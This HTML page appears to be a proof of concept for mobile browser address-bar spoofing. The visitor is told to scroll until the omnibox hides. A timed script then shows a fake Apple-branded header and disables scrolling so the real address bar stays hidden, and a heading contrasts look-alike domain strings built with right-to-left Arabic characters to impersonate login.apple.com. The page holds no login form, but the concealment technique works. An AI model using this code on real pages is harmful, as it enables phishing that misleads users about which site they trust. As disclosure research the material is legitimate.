<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Scroll Page</title>

<style>

body{
    height:3000px;
    font-family:sans-serif;
    margin:0;
}

#topLogo{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:70px;
    background:white;
    display:none;
    text-align:center;
    z-index:9999;
    border-bottom:1px solid #ddd;
}

#topLogo img{
    height:40px;
    margin-top:15px;
}


#loginPage{
    position:absolute;
    left:0;
    width:100%;
    background:white;
    display:none;
    padding-top:100px;
}

.login-box{
    width:90%;
    max-width:420px;
    margin:auto;
    text-align:center;
}

input{
    width:100%;
    padding:14px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:6px;
    font-size:16px;
}

button{
    width:100%;
    padding:14px;
    margin-top:10px;
    background:#007bff;
    color:white;
    border:none;
    border-radius:6px;
    font-size:16px;
}

</style>
</head>

<body>

<h1 style="padding:20px;">scroll up and scroll down until the omnibox disappears (do it before 5 seconds)</h1>

<div id="topLogo">
<img src="apple-logo.png" style="width: 100%; height: 70px;">
</div>

<div id="loginPage">
<div class="login-box">

<h2>The address bar is wrong because the correct one is 
    <b>ا.login.apple.com.ا.google.com.poczephyrus.my.id</b> Not <b>google.com.poczephyrus.my.id.ا.login.apple.com.ا</b></h2>

</div>
</div>

<script>

let startY = 0;
let blockUp = false;

setTimeout(function(){

    blockUp = true;

    let login = document.getElementById("loginPage");
    let logo = document.getElementById("topLogo");

    login.style.top = window.scrollY + "px";
    login.style.display = "block";

    logo.style.display = "block";

},5000);


document.addEventListener("touchstart", function(e){
    startY = e.touches[0].clientY;
}, {passive:false});

document.addEventListener("touchmove", function(e){

    if(!blockUp) return;

    e.preventDefault();

}, {passive:false});


document.addEventListener("wheel", function(e){

    if(!blockUp) return;

    e.preventDefault();

}, {passive:false});

</script>

</body>
</html>
